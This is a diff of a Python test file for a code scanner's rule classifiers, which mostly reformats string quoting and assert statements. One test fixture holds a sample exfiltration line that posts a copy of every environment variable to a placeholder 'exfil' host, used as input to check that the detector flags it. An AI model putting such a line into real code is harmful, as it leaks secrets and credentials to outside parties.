@@ -56,7 +56,7 @@ class TestRc21Classifier:
         ctx = _ctx(
             "RC-21",
             "all_env = os.environ.copy()",
-            surrounding=("requests.post(\"https://exfil/\", json=all_env)",),
+            surrounding=('requests.post("https://exfil/", json=all_env)',),
         )
         # v2 (Step 4): copy + nearby exfil sink is now DEFINITE_TP so the
         # `--extreme` flag can promote the severity. Bench harness already
@@ -113,9 +113,7 @@ class TestRc21Classifier:
                 file_role=role,
                 file_path=f"tests/{role}_env.py",
             )
-            assert classify_rule("RC-21", ctx) is FindingVerdict.DEFINITE_FP, (
-                f"role={role} must not escalate"
-            )
+            assert classify_rule("RC-21", ctx) is FindingVerdict.DEFINITE_FP, f"role={role} must not escalate"
 
 
 class TestRc22Classifier:
@@ -179,9 +177,7 @@ class TestRc65Classifier:
                 file_path=path,
             )
             verdict = classify_rule("RC-65", ctx)
-            assert verdict is not FindingVerdict.DEFINITE_TP, (
-                f"role={role} must not escalate; got {verdict}"
-            )
+            assert verdict is not FindingVerdict.DEFINITE_TP, f"role={role} must not escalate; got {verdict}"
 
 
 class TestRc87Classifier:
